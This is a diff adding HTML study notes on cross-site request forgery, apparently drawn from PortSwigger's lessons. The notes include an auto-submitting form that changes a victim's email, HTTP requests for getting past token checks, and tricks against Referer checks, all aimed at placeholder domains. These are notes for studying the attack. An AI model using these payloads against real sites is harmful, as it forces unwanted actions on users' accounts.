@@ -1,0 +1,93 @@
+<h1 id="csrf-portswigger">CSRF (portswigger)</h1>
+<hr />
+<p>Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.</p>
+
+<p>for CSRF we need:</p>
+<ol>
+  <li>relevant action</li>
+  <li>cookie based session handling: Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests.</li>
+  <li>No unpredictable request parameters: The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess.</li>
+</ol>
+
+<p><strong>HTTP request example</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
+
+email=wiener@normal-user.com
+</code></pre></div></div>
+
+<p><strong>attack example</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://vulnerable-website.com/email/change"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"pwned@evil-user.net"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+    <span class="nt">&lt;script&gt;</span>
+      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+    <span class="nt">&lt;/script&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<h2 id="csrf-token-bypass-example">csrf token bypass example</h2>
+
+<p><strong>some apps validate only post methods</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /email/change?email=pwned@evil-user.net HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+</code></pre></div></div>
+
+<p><strong>bypass if the app depends on the token being present</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+email=pwned@evil-user.net
+</code></pre></div></div>
+
+<p><strong>bypass if the token is not tied to the user session:</strong><br />
+ In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.</p>
+
+<p><strong>CSRF token is tied to a non-session cookie</strong>
+  In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:</p>
+
+<p>This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim’s browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com
+</code></pre></div></div>
+<p><strong>CSRF token is simply duplicated in a cookie</strong>
+ some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+
+csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com
+</code></pre></div></div>
+
+<p>In this situation, the attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. Here, the attacker doesn’t need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack.</p>
+
+<p><strong>Referer-based defenses against CSRF</strong>
+easey to change the referer</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;meta name="referrer" content="never"&gt;
+ http://attacker-website.com/csrf-attack?vulnerable-website.com
+
+If the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:
+
+http://vulnerable-website.com.attacker-website.com/csrf-attack
+</code></pre></div></div>
+<p><strong>prevention</strong>
+. using csrf token and validation for every methods Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.</p>
